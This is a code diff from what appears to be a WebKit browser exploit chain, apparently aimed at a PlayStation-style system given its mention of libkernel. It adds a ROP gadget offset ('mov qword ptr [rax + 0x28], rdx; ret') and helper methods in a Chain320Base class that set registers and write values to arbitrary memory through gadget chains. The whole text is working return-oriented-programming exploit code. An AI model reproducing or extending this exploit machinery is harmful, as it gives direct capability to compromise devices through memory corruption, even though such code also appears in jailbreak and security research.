@@ -401,7 +401,8 @@ let webkit_gadget_offsets = new Map(
     "mov dword ptr [rdi], eax; ret": 0x000000000003469f, // `89 07 c3`
     // esi gadget is not present in webkit, libc, and libkernel, so we use ecx/edx
     "mov dword ptr [rax], ecx; ret": 0x0000000000404ef5, // `89 08 c3`
-    "mov dword ptr [rax], edx; ret": 0x00000000001378b5, // `89 10 c3`
+    "mov dword ptr [rax], edx; ret": 0x00000000001378b5, // `89 10 c3`,
+    "mov qword ptr [rax + 0x28], rdx; ret": 0x0000000000e5c597, // `48 89 50 28 c3`
   }),
 );
 
@@ -467,6 +468,26 @@ class Chain320Base extends ChainBase {
     this.push_gadget("pop rax; ret");
     this.push_value(value);
     this.push_gadget("mov qword ptr [rdi], rax; ret");
+  }
+
+  push_set_rdi(value) {
+    this.push_gadget("pop rdi; ret");
+    this.push_value(value)
+  }
+
+  push_set_rax(v) {
+    this.push_gadget("pop rax; ret");
+    this.push_value(v)
+  }
+
+  push_store_rax_into_memory(addr) {
+    this.push_set_rdi(addr)
+    this.push_gadget("mov qword ptr [rdi], rax; ret");
+  }
+
+  push_store_rdx_into_memory(addr) { // clobbers rax
+    this.push_set_rax(addr.sub(0x28))
+    this.push_gadget("mov qword ptr [rax + 0x28], rdx; ret");
   }
 
   push_get_retval() {
